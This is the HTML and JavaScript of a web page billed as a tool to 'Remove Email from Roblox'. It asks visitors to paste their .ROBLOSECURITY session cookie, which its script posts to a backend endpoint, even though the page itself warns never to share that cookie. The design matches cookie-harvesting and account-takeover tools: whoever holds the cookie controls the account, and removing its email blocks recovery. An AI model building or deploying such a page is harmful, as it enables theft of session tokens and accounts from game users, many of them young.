<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Remove Email from Roblox</title>
  <style>
    body {
      background-color: #f4f6f8;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 25px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 500px;
      text-align: center;
    }
    h2 {
      color: #333;
    }
    textarea {
      width: 100%;
      height: 120px;
      margin: 15px 0;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      resize: none;
    }
    button {
      padding: 12px 25px;
      background-color: #de3c4b;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:hover {
      background-color: #c62f3e;
    }
    .info {
      font-size: 14px;
      color: #777;
    }
    #result {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Remove Email from Roblox</h2>
    <p class="info">⚠️ Do not share your <code>.ROBLOSECURITY</code> cookie with anyone.</p>
    <form id="removeForm">
      <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..." required></textarea>
      <br>
      <button type="submit">Remove Email</button>
    </form>
    <div id="result"></div>
  </div>

  <script>
    document.getElementById('removeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const cookie = document.getElementById('cookieInput').value.trim();
      const result = document.getElementById('result');
      result.textContent = '⏳ Processing...';

      try {
        const res = await fetch('/api/remove-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ cookie })
        });

        const data = await res.json();
        if (res.ok) {
          result.textContent = `✅ ${data.message}`;
        } else {
          result.textContent = `❌ ${data.error || 'Something went wrong'}`;
        }
      } catch (err) {
        result.textContent = `❌ Network error: ${err.message}`;
      }
    });
  </script>
</body>
</html>
